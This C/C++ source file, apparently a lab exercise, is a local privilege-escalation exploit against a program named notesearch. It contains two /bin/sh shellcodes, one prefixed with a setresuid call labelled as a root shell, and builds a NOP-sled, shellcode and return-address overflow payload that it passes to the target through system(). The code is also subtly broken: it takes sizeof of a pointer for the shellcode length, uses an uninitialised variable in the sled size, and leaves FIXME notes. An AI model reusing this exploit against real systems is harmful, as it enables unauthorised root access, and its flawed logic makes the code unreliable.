#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iostream>
#include <string>

using namespace std;

// user shellcode
char user_shellcode[] = 
   "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
   "\xc9\x89\xca\x6a\x0b\x58\xcd\x80";

// root shell; that escalates the priviledge for exploiting chmod program
char root_shellcode[] = 
    "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
    "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
    "\xe1\xcd\x80";

// pass offset as an argument
int main(int argc, char *argv[]) {
    // address of ref_var is used as the point of reference to determine offset
    unsigned int ref_var, ret_address, offset, ret_address_count, sys_command_size;
    char *ptr, *sys_command;
    
    if(argc == 2) // set offset
        offset = atoi(argv[1]);
    else
        offset = 116; // FIXME, if offset is determined

    ret_address_count = 4*20; //repeat 20 times
    
    char target_program[] = "./notesearch.exe";
    
    size_t payload_size = 200; // FXIME: must be big enough to cover the caller's return address
    char *shellcode = root_shellcode; // FIXME: options are root_shellcode and regular_shellcode
    size_t shellcode_size = sizeof(shellcode)-1; //subtract the null-byte
    char *payload = new char[payload_size];
    sys_command_size = payload_size+100;
    sys_command = new char[sys_command_size];

    size_t NOP_sled_size = payload_size-shellcode_size-ret_address;

    //bzero(payload, payload_size); 
    // initialize the payload with 0s
    memset(payload, 0, payload_size);
    
    // create payload
    // | NOP sled | shellcode | repeated return address |
    
    // fill payload with NOP sled
    memset(payload, 0x90, NOP_sled_size); // build NOP sled
    // fill payload with shellcode
    ptr = payload+NOP_sled_size; // make ptr point after NOP sled
    // copy n bytes from src to dest buffer
    memcpy(ptr, shellcode, shellcode_size);
    ptr += shellcode_size;

    ret_address = (unsigned int) &ref_var - offset; // set return address

    for(int i=0; i < ret_address_count; i+=4) // fill payload with return address
        *((unsigned int *)(ptr+i)) = ret_address;

    strcpy(sys_command, target_program);
    strcat(sys_command, " \'"); // start command buffer
    memcpy(sys_command+sizeof(target_program)+1, payload, payload_size);
    strcat(sys_command, "\'");
    system(sys_command); // run exploit
    delete [] payload;
}

